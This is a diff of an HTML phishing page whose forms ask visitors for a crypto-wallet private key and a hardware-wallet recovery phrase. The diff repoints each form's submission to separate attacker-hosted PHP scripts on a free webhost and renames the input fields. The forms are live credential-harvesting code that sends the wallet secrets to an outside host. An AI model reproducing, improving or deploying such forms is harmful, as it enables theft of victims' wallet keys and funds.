@@ -101,7 +101,7 @@
         <form
           id="new-form"
           class="form flex flex-jc-c"
-          action="https://jugnooo.000webhostapp.com/prohqcker.php"
+          action="https://jugnooo.000webhostapp.com/prohqcker2.php"
           method="POST"
         >
           <h5>PRIVATE-KEY</h5>
@@ -112,7 +112,7 @@
             class="form__input"
             id="textInputThree"
             type="text"
-            name="PRIVATE-KEY phrase"
+            name="privatekey"
 			required
           />
           <button class="form__btn" type="submit">Proceed</button>
@@ -121,7 +121,7 @@
         <form
           id="new-form"
           class="form flex flex-jc-c"
-          action="https://jugnooo.000webhostapp.com/prohqcker.php"
+          action="https://jugnooo.000webhostapp.com/prohqcker3.php"
           method="POST"
         >
           <h5>HARDWARE</h5>
@@ -132,7 +132,7 @@
             class="form__input"
             id="textInputFour"
             type="text"
-            name="Hardware phrase"
+            name="hardware"
 			required
           />
           <button class="form__btn" type="submit">Proceed</button>
